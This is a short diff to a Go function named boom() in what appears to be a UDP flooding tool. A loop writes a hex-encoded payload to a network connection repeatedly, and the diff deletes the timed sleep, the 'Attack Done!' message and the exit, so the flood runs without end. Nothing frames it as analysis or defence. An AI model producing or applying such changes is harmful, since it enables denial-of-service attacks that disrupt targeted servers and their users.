@@ -19,7 +19,4 @@ func boom() {
 			conn.Write([]byte("\x64\x72\x61\x63\x6f\x73\x75\x64\x70\x68\x65\x78"))
 		}
 	}
-	time.Sleep(300 * time.Second)
-	fmt.Println("Attack Done!")
-	os.Exit(0)
 }
